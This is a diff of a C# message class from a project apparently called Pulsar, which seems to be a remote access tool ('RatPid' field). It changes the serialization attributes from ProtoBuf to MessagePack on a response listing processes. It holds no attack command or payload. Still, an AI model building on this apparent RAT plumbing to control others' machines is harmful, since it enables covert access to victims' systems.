@@ -1,16 +1,16 @@
-﻿using ProtoBuf;
+﻿using MessagePack;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Models;
 
 namespace Pulsar.Common.Messages.Administration.TaskManager
 {
-    [ProtoContract]
+    [MessagePackObject]
     public class GetProcessesResponse : IMessage
     {
-        [ProtoMember(1)]
+        [Key(1)]
         public Process[] Processes { get; set; }
 
-        [ProtoMember(2)]
+        [Key(2)]
         public int? RatPid { get; set; }
     }
 }
